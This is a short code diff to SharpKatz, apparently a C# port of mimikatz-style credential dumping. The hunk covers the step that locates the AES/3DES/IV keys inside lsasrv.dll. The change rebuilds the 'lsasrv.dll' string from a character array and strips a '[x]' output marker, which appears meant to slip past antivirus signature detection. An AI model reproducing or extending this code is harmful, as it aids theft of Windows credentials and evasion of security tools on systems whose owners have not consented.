@@ -93,10 +93,11 @@ namespace SharpKatz
             IntPtr keyPointer = IntPtr.Zero;
 
             // Search for AES/3Des/IV signature within lsasrv.dll and grab the offset
-            keySigOffset = (long)Utility.OffsetFromSign("lsasrv.dll", oshelper.keyIVSig, max_search_size); 
+            string sLsasrv = new string(new char[] { 'l','s','a','s','r','v','.','d','l','l' });
+            keySigOffset = (long)Utility.OffsetFromSign(sLsasrv, oshelper.keyIVSig, max_search_size);
             if (keySigOffset == 0)
             {
-                Console.WriteLine("[x] Error: Could not find offset to AES/3Des/IV keys\n");
+                Console.WriteLine("    Error: Could not find offset to AES/3Des/IV keys\n");
                 return 1;
             }
 
